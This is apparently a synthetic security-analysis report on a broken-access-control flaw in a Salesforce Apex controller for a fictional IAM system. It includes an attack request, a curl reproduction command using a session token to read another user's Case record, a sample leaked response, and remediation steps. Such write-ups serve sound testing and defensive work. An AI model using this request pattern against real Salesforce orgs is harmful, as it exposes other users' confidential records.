# Security Analysis Report
**System:** VaultGuard IAM API (Salesforce-Integrated)
**Domain:** Cloud IAM / Identity & Access Management
**Example ID:** SF-0094
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.2 | Horizontal privilege escalation on `CaseController.getCaseDetails` — attacker reads any IAM Case record without ownership or role check |

---

## Finding 1 — BAC: Horizontal Privilege Escalation on Case Object (Pattern 2.2)

### Summary
The Apex controller `CaseController` on VaultGuard IAM API (`03fa5ce0.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Case object. Per §5.0 Pattern 2.2, horizontal privilege escalation allows any authenticated user to read any peer user's IAM Case records.

**Context.txt consistency:** The Apex method in §4.0 is `getCaseDetails(String caseId, ...)` and the Aura descriptor in §6.0 is `c.CaseController.getCaseDetails`. These are consistent — no naming conflict.

**Pattern:** 2.2 — Horizontal privilege escalation (BAC)
**Affected controller:** `c.CaseController.getCaseDetails`
**Affected endpoint:** `POST https://03fa5ce0.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://03fa5ce0.lightning.force.com/aura
Authorization: Bearer 00D03FA5CE0!AR03fa5ce0...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D03FA5CE0!AR03fa5ce0...

message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN",
"params":{"caseId":"0015CE0","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Case Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0015CE0", "Name": "Victim Case Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-10-2773"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D03FA5CE0!AR03fa5ce0..."
curl -s -X POST "https://03fa5ce0.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.CaseController.getCaseDetails","callingDescriptor":"UNKNOWN","params":{"caseId":"0015CE0","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-10-2773
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class CaseController { ... }`
2. `WHERE Id = :caseId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
